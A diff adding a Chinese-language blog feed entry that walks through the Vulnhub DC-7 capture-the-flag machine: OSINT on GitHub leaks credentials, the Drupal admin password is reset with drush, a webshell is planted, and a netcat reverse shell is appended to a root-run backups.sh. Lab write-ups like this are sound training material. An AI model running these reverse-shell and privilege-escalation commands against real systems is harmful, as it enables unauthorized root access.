@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>Vulnhub-DC-7</title>
+      <link href="/undefined/35178.html"/>
+      <url>/undefined/35178.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>下载地址：<a href="https://download.vulnhub.com/dc/DC-7.zip">https://download.vulnhub.com/dc/DC-7.zip</a></p><h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><p>存活IP扫描<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101545737.png" alt="image-20230710154535976"><br>访问页面，内容为Drupal的CMS<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546614.png" alt="image-20230710154607577"><br>页面上面没啥东西，但是页面下有<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546544.png" alt="image-20230710154617505"><br>百度一下这个用户发现为其GitHub<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546648.png" alt="image-20230710154627596"><br>访问其config.php得到数据库账号密码，但是登录不上却可以登录ssh<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546146.png" alt="image-20230710154646095"><br>连接如下<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546247.png" alt="image-20230710154656166"><br>打开mbox发现存在<code>/opt/scripts/backups.sh</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547561.png" alt="image-20230710154719484"><br>访问其目录，查看backups.sh<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547994.png" alt="image-20230710154736908"><br>发现有个drush命令，但是不知道其作用，搜索后发现这个命令可以修改密码，进入到var&#x2F;www&#x2F;html使用其命令修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure><p>然后利用这个账号密码去登陆<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547364.png" alt="image-20230710154749303"><br>在Content—&gt;Add content–&gt;Basic page下准备写马但是不支持，将php进行引入!<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547449.png" alt="image-20230710154758394"><br>如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548482.png" alt="image-20230710154812450"><br>然后把这个扩展开启了再进入刚刚那个界面<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548082.png" alt="image-20230710154820011"><br>然后写入木马<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548475.png" alt="image-20230710154835443"><br>最后用4连上了，奇奇怪怪<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548880.png" alt="image-20230710154845834"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>进入opt目录，写入打开终端然后写入提权的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.75.128 6666 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure><p>emmmm，使用这个命令成功了但是执行命令老是失败，弹个shell试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.75.158 6666</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548691.png" alt="image-20230710154855636"><br>执行命令，这里要稍微等一会儿<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101549662.png" alt="image-20230710154922627"><br>拿到root权限<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101549169.png" alt="image-20230710154932069"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Vulnhub-DC-6</title>
       <link href="/undefined/18859.html"/>
       <url>/undefined/18859.html</url>
